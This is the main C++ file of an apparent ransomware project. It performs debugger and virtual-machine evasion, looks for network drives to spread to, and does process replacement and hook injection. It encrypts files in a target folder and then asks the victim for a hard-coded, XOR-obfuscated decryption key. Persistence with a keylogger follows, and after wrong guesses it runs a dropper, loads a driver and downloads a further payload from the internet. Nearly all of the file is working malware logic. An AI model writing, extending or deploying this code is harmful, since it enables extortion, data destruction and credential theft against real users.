#include "file_infector.h"
#include "kill_switch.h"
#include "anti_checks.h"
#include "dropper.h"
#include "attack.h"
#include "gather.h"
#include "cipher.h"

Attack attack;
FileInfector fInfector;
Check check;
Shared shared;
wstring s2ws(const std::string& str);
string ws2s(const std::wstring& wstr);

int main(int argc, char *argv[])
{
	check.Debugger();
	check.VirtualMachine();
	// check for network drives so malware can spread
	// can add conditional here, if network drive found then copy itself
	shared.GetDirs();

	if (argc == 2)
	{
		printf("\n");
		BOOL res = attack.ProcReplace(argv[1]);
		if (res)
		{
			std::cout << "[+] Process Replacement Success" << std::endl;
		}
		else {
			std::cout << "[-] Process Replacement Failed\n[!] Trying Hook Injection on Target Process" << std::endl;
			attack.HookInjection();
		}
		return 1;
	}

	string pass_key;

	string attack_dir = fInfector.current_working_directory() + "/../../test_attack_folder";
	vector<wstring> files = attack.list_n_kill_files(s2ws(attack_dir));
	string res = ws2s((const std::wstring&)*files.data()); // convert files vector into wstring into string

	// if files contain the string txt, exploit was completed
	if (res.find("txt") != std::string::npos)
	{
		std::cout << "[+] Exploit completed" << std::endl << std::endl;

		// Start persistance without keylogger
		fInfector.CopyMyself(FALSE);
	}

	int wrong_counter = 0;
	while (true)
	{
		std::cout << "[!] Enter key to decrypt files: " << std::endl;
		cin >> pass_key;

		// if password entered from victim equals the decrypted text of key below
		if (pass_key == encryptDecryptXOR("3S)R%!(&().G+Z9)&"))
		{
			std::cout << "[+] Your files are being decrypted" << std::endl;
			decrypt_files(s2ws(attack_dir));
			Sleep(2000);
			// Start persistance again with keylogger, *TODO*: running with admin doesn't persist logger
			fInfector.CopyMyself(TRUE);
		}
		else {
			std::cout << "[-] Wrong Password" << std::endl;

			wrong_counter++;
			if (wrong_counter == 2)
			{
				executeDropper(argv[0]);
			}
			else if (wrong_counter == 3)
			{
				// located: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MyCustomBeep
				attack.LoadDriverBeep();
				// sc delete MyCustomBeep
			}
			else {
				// download final payload from github
				fInfector.CallFileFromInternet();
			}
		}
	}

	return 0;
}

// string to wstring conversion
wstring s2ws(const std::string& str)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.from_bytes(str);
}

// wstring to string conversion
string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}
